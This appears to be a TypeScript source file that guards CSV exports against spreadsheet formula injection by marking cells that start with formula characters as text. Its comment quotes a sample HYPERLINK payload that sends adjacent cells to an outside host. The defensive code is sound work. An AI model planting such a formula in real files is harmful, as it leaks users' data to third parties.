/**
 * Issue #394 — a cell we write into a CSV must never run as a formula when someone opens it.
 *
 * Excel, LibreOffice and Google Sheets treat a cell that starts with `=`, `+`, `-` or `@` as a
 * formula, and a leading tab or carriage return can hide one. A party name like
 * `=HYPERLINK("http://example.invalid/?"&A1,"fix")` would otherwise send the cells next to it to an
 * outside site the moment the accountant opens the file. Prefixing `'` makes the spreadsheet show the
 * cell as plain text (OWASP "CSV Injection"; threat model M1).
 *
 * A plain number such as `-1250.00` or `+919845012345` is left alone: it cannot run anything, and a
 * negative balance must stay a number the person can add up.
 */
const FORMULA_START = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^[+-]?\d+(\.\d+)?$/;

export const SPREADSHEET_TEXT_MARK = "'";

export const neutraliseSpreadsheetCell = (value: string): string =>
  FORMULA_START.test(value) && !PLAIN_NUMBER.test(value) ? `${SPREADSHEET_TEXT_MARK}${value}` : value;

/** Undoes our own mark when a file we wrote comes back in, so a corrected row reads as it was. */
export const restoreSpreadsheetCell = (value: string): string =>
  value.startsWith(SPREADSHEET_TEXT_MARK) && FORMULA_START.test(value.slice(1)) ? value.slice(1) : value;
